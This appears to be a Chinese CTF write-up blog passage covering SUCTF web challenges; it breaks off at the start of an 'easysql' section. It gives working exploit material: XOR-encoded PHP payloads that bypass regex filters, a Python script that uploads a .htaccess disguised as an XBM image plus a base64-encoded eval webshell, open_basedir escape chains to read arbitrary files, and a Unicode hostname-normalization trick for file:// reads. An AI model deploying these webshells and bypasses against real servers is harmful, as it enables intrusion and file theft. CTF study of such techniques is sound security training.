id="easyphp-异或webshell-bypass-DF"><a href="#easyphp-异或webshell-bypass-DF" class="headerlink" title="easyphp(异或webshell bypass_DF)"></a>easyphp(异或webshell bypass_DF)</h2><p>一道类似题</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$_</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[\x00- 0-9\'"`$&amp;.,|[{_defgops\x7F]+/i'</span><span class="token punctuation">,</span> <span class="token variable">$_</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'rosé will not do it'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">count_chars</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0xd</span> <span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'you are so close, omg'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$_</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>第一个正则匹配[\0-空格] [0-9] [‘“`$&amp;.,|[{_defgops\x7F]</p><p>第二个过滤，<code>strtolower</code>将字符串转换为小写，用<code>count_chars</code>返回由所有使用了的字节值组成的字符串，再判断其中每个字符累计出现次数是否大于 13</p><p>看看可以使用的函数</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span> <span class="token variable">$arr</span> <span class="token operator">=</span> <span class="token function">get_defined_functions</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token string">'internal'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">foreach</span> <span class="token punctuation">(</span><span class="token variable">$arr</span> <span class="token keyword">as</span> <span class="token variable">$key</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[\x00- 0-9\'"`$&amp;.,|[{_defgops\x7F]+/i'</span><span class="token punctuation">,</span> <span class="token variable">$value</span><span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token function">count_chars</span><span class="token punctuation">(</span><span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$value</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">0x3</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0xd</span> <span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">unset</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">[</span><span class="token variable">$key</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">continue</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token function">var_dump</span><span class="token punctuation">(</span><span class="token variable">$arr</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><pre class=" language-php"><code class="language-php">bcmul rtrim trim ltrim chr link unlink tan atan atanh tanh intval mail min max virtual</code></pre><p>再看看可以用的字符</p><pre><code>[&#39;!&#39;, &#39;%&#39;, &#39;+&#39;, &#39;-&#39;, &#39;*&#39;, &#39;/&#39;, &#39;&gt;&#39;, &#39;&lt;&#39;, &#39;?&#39;, &#39;=&#39;, &#39;:&#39;, &#39;@&#39;, &#39;^&#39;]</code></pre><h3 id="way1"><a href="#way1" class="headerlink" title="way1"></a>way1</h3><p>字符串异或</p><pre><code>echo qiqhnin^iiiiibi^hhhhimh;//phpinfo(qiqhnin^iiiiibi^hhhhimh)();//phpinfo()</code></pre><h3 id="way2"><a href="#way2" class="headerlink" title="way2"></a>way2</h3><p>16进制异或</p><pre class=" language-php"><code class="language-php">t <span class="token operator">=</span> s<span class="token operator">^</span>c<span class="token operator">^</span>dn <span class="token operator">=</span> i<span class="token operator">^</span>c<span class="token operator">^</span>dr <span class="token operator">=</span> a<span class="token operator">^</span>c<span class="token operator">^</span>p<span class="token variable">$p</span><span class="token operator">=</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token string">'%ff%ff%ff%ff%ff%ff%ff'</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token string">'%8f%9e%96%96%8c%a0%9e'</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token string">'%ff%9c%ff%9c%9c%ff%9c'</span><span class="token punctuation">)</span><span class="token operator">^</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token string">'%ff%8f%ff%9b%9b%ff%8f'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//print_r</span>print_r <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token operator">%</span>8f<span class="token operator">%</span>9e<span class="token operator">%</span><span class="token number">96</span><span class="token operator">%</span><span class="token number">96</span><span class="token operator">%</span>8c<span class="token operator">%</span>a0<span class="token operator">%</span>9e<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token operator">%</span>ff<span class="token operator">%</span>9c<span class="token operator">%</span>ff<span class="token operator">%</span>9c<span class="token operator">%</span>9c<span class="token operator">%</span>ff<span class="token operator">%</span>9c<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token operator">%</span>ff<span class="token operator">%</span>8f<span class="token operator">%</span>ff<span class="token operator">%</span>9b<span class="token operator">%</span>9b<span class="token operator">%</span>ff<span class="token operator">%</span>8f<span class="token punctuation">)</span><span class="token punctuation">)</span>scandir <span class="token operator">-</span><span class="token operator">></span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token operator">%</span>8c<span class="token operator">%</span>9c<span class="token operator">%</span>9e<span class="token operator">%</span><span class="token number">96</span><span class="token operator">%</span>9b<span class="token operator">%</span><span class="token number">96</span><span class="token operator">%</span>9e<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>9c<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>9c<span class="token punctuation">)</span><span class="token operator">^</span><span class="token punctuation">(</span><span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>9b<span class="token operator">%</span>ff<span class="token operator">%</span>ff<span class="token operator">%</span>8f<span class="token punctuation">)</span><span class="token punctuation">)</span>即可进行函数操作了</code></pre><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">function</span> <span class="token function">get_the_flag</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// webadmin will remove your upload file every 20 min!!!! </span>    <span class="token variable">$userdir</span> <span class="token operator">=</span> <span class="token string">"upload/tmp_"</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$_SERVER</span><span class="token punctuation">[</span><span class="token string">'REMOTE_ADDR'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">file_exists</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">mkdir</span><span class="token punctuation">(</span><span class="token variable">$userdir</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">empty</span><span class="token punctuation">(</span><span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$tmp_name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"tmp_name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token variable">$_FILES</span><span class="token punctuation">[</span><span class="token string">"file"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$extension</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token function">strrpos</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token string">"."</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">"/ph/i"</span><span class="token punctuation">,</span><span class="token variable">$extension</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">mb_strpos</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'&lt;?'</span><span class="token punctuation">)</span><span class="token operator">!==</span>False<span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">exif_imagetype</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"^_^"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>         <span class="token variable">$path</span><span class="token operator">=</span> <span class="token variable">$userdir</span><span class="token punctuation">.</span><span class="token string">"/"</span><span class="token punctuation">.</span><span class="token variable">$name</span><span class="token punctuation">;</span>        @<span class="token function">move_uploaded_file</span><span class="token punctuation">(</span><span class="token variable">$tmp_name</span><span class="token punctuation">,</span> <span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$path</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$hhh</span> <span class="token operator">=</span> @<span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'_'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">18</span><span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'One inch long, one inch strong!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string">'/[\x00- 0-9A-Za-z\'"\`~_&amp;.,|=[\x7F]+/i'</span><span class="token punctuation">,</span> <span class="token variable">$hhh</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">'Try something else!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$character_type</span> <span class="token operator">=</span> <span class="token function">count_chars</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$character_type</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">12</span><span class="token punctuation">)</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string">"Almost there!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$hhh</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><h3 id="第一步，绕正则"><a href="#第一步，绕正则" class="headerlink" title="第一步，绕正则"></a>第一步，绕正则</h3><p>Php的经典特性“Use of undefined constant”，会将代码中没有引号的字符都自动作为字符串，7.2开始提出要被废弃，不过目前还存在着。</p><p>Ascii码大于 0x7F 的字符都会被当作字符串，而和 0xFF 异或相当于取反，可以绕过被过滤的取反符号。</p><p>构造payload</p><pre><code>${&quot;`{{{&quot;^&quot;?&lt;&gt;/&quot;}[&#39;+&#39;];&amp;+=getflag //$_GET[&#39;+&#39;];&amp;+=getflag</code></pre><p>最后的payload为</p><pre><code>?_=${%A0%B8%BA%AB^%ff%ff%ff%ff}{%A0}();&amp;%A0=get_the_flag//echo urlencode(&#39;_GET&#39;^urldecode(&#39;%ff%ff%ff%ff&#39;)); =&gt; %A0%B8%BA%AB</code></pre><h3 id="第二步，上传webshell"><a href="#第二步，上传webshell" class="headerlink" title="第二步，上传webshell"></a>第二步，上传webshell</h3><p>用#define width 1#define height 1开头的.htaccess伪装XBM文件(X Bit Map) 绕过exif_imagetype()函数</p><p>AddType application/x-httpd-php .hh添加hh后缀</p><p>base64绕过内容检测&lt;? 其中加入GIF89AAA头部绕过exif_imagetype()，base64四位一组加密</p><pre class=" language-python"><code class="language-python"><span class="token keyword">import</span> requestsurl <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>payload <span class="token operator">=</span> <span class="token string">"?_=${%ff%ff%ff%ff^%a0%b8%ba%ab}{%ff}();&amp;%ff=get_the_flag"</span>files <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">".htaccess"</span><span class="token punctuation">,</span><span class="token triple-quoted-string string">"""#define width 1#define height 1AddType application/x-httpd-php .hhphp_value auto_prepend_file "php://filter/convert.base64-decode/resource=webshell.hh """</span><span class="token punctuation">)</span><span class="token punctuation">}</span>r1 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span>payload<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r1<span class="token punctuation">.</span>text<span class="token punctuation">)</span>exp<span class="token operator">=</span><span class="token triple-quoted-string string">"""GIF89AAAPD9waHAgZXZhbCgkX1BPU1RbImEiXSk7"""</span>files <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">'file'</span><span class="token punctuation">:</span><span class="token punctuation">(</span><span class="token string">"webshell.hh"</span><span class="token punctuation">,</span>exp<span class="token punctuation">)</span><span class="token punctuation">}</span>r2 <span class="token operator">=</span> requests<span class="token punctuation">.</span>post<span class="token punctuation">(</span>url<span class="token operator">+</span>payload<span class="token punctuation">,</span> files<span class="token operator">=</span>files<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>r2<span class="token punctuation">.</span>text<span class="token punctuation">)</span></code></pre><p><a href="https://thibaudrobin.github.io/articles/bypass-filter-upload/" target="_blank" rel="noopener">https://thibaudrobin.github.io/articles/bypass-filter-upload/</a></p><h3 id="第三步，bypass-disable-function"><a href="#第三步，bypass-disable-function" class="headerlink" title="第三步，bypass disable function"></a>第三步，bypass disable function</h3><pre><code>a=mkdir(&quot;/tmp/hh&quot;);chdir(&#39;/tmp/hh&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(scandir(&quot;/&quot;));</code></pre><pre><code>a=mkdir(&quot;/tmp/hh&quot;);chdir(&#39;/tmp/hh&#39;);ini_set(&#39;open_basedir&#39;,&#39;..&#39;);chdir(&#39;..&#39;);ini_set(&#39;open_basedir&#39;,&#39;/&#39;);var_dump(file_get_contents(&quot;/THis_Is_tHe_F14g&quot;));</code></pre><p><a href="https://xz.aliyun.com/t/4720" target="_blank" rel="noopener">https://xz.aliyun.com/t/4720</a></p><h2 id="pythonngix-urlparse"><a href="#pythonngix-urlparse" class="headerlink" title="pythonngix(urlparse)"></a>pythonngix(urlparse)</h2><pre class=" language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">getUrl</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    url <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"url"</span><span class="token punctuation">)</span>    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 111"</span>    parts <span class="token operator">=</span> list<span class="token punctuation">(</span>urlsplit<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>    host <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 222 "</span> <span class="token operator">+</span> host    newhost <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> h <span class="token keyword">in</span> host<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        newhost<span class="token punctuation">.</span>append<span class="token punctuation">(</span>h<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'idna'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>newhost<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#去掉 url 中的空格</span>    finalUrl <span class="token operator">=</span> urlunsplit<span class="token punctuation">(</span>parts<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> urllib<span class="token punctuation">.</span>request<span class="token punctuation">.</span>urlopen<span class="token punctuation">(</span>finalUrl<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token string">"我扌 your problem? 333"</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">80</span><span class="token punctuation">)</span></code></pre><p>直接是用<code>blackhat</code>议题<a href="https://i.blackhat.com/USA-19/Thursday/us-19-Birch-HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization.pdf" target="_blank" rel="noopener">PPT链接</a></p><pre class=" language-python"><code class="language-python">Python was vulnerable<span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlsplit<span class="token punctuation">,</span> urlunsplit<span class="token operator">>></span><span class="token operator">></span> url <span class="token operator">=</span> <span class="token string">'http://canada.c℀.microsoft.com/some.txt'</span><span class="token operator">>></span><span class="token operator">></span> parts <span class="token operator">=</span> list<span class="token punctuation">(</span>urlsplit<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> host <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> host<span class="token string">'canada.c℀.microsoft.com'</span><span class="token operator">>></span><span class="token operator">></span> newhost <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">>></span><span class="token operator">></span> <span class="token keyword">for</span> h <span class="token keyword">in</span> host<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> newhost<span class="token punctuation">.</span>append<span class="token punctuation">(</span>h<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'idna'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token operator">>></span><span class="token operator">></span> parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>newhost<span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> finalUrl <span class="token operator">=</span> urlunsplit<span class="token punctuation">(</span>parts<span class="token punctuation">)</span><span class="token operator">>></span><span class="token operator">></span> finalUrl<span class="token string">'http://canada.ca/c.microsoft.com/some.txt'</span></code></pre><p>用脚本爆破最后一个字符</p><pre class=" language-python"><code class="language-python"><span class="token comment" spellcheck="true"># -*- coding: utf-8 -*-</span><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> urlsplit<span class="token punctuation">,</span> urlunsplit<span class="token keyword">from</span> urllib <span class="token keyword">import</span> parse<span class="token keyword">def</span> <span class="token function">getUrl</span><span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    parts <span class="token operator">=</span> list<span class="token punctuation">(</span>urlsplit<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>    host <span class="token operator">=</span> parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span>    newhost <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>    <span class="token keyword">for</span> h <span class="token keyword">in</span> host<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'.'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        newhost<span class="token punctuation">.</span>append<span class="token punctuation">(</span>h<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'idna'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    parts<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'.'</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span>newhost<span class="token punctuation">)</span>    <span class="token comment" spellcheck="true">#去掉 url 中的空格</span>    finalUrl <span class="token operator">=</span> urlunsplit<span class="token punctuation">(</span>parts<span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">' '</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>    host <span class="token operator">=</span> parse<span class="token punctuation">.</span>urlparse<span class="token punctuation">(</span>finalUrl<span class="token punctuation">)</span><span class="token punctuation">.</span>hostname    <span class="token keyword">if</span> host <span class="token operator">==</span> <span class="token string">'suctf.cc'</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> finalUrl    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">for</span> x <span class="token keyword">in</span> range<span class="token punctuation">(</span><span class="token number">114111</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    uni<span class="token operator">=</span>chr<span class="token punctuation">(</span>x<span class="token punctuation">)</span>    url <span class="token operator">=</span> <span class="token string">"http://suctf.c{}"</span><span class="token punctuation">.</span>format<span class="token punctuation">(</span>uni<span class="token punctuation">)</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token keyword">if</span> getUrl<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span> <span class="token punctuation">(</span>getUrl<span class="token punctuation">(</span>url<span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"str:"</span><span class="token operator">+</span>url<span class="token operator">+</span><span class="token string">"unicode:\\u"</span><span class="token operator">+</span>str<span class="token punctuation">(</span>hex<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">except</span><span class="token punctuation">:</span>        <span class="token keyword">pass</span></code></pre><pre><code>str:ℂ unicode:\u2102str:℅ unicode:\u2105str:℆ unicode:\u2106str:ℭ unicode:\u212dstr:Ⅽ unicode:\u216dstr:ⅽ unicode:\u217dstr:ç unicode:\u24b8str:ⓒ unicode:\u24d2str:Ｃ unicode:\uff23str:ｃ unicode:\uff43</code></pre><p>读取nginx配置文件 /usr/local/nginx/conf/nginx.conf</p><p>得到flag路径/usr/fffffflag;</p><pre><code>GET /getUrl?url=file://suctf.c%E2%93%92/usr/fffffflagGET /getUrl?url=file://suctf.c℆sr/fffffflag</code></pre><h2 id="easysql-mysql设置"><a href="#easysql-mysql设置" class="headerlink" title="easysql(mysql设置)"></a>easysql(mysql设置)</h2><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span>    <span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">include_once</span> <span class="token string">"config.php"</span><span class="token punctuation">;</span>    <span class="token variable">$post</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$get</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token 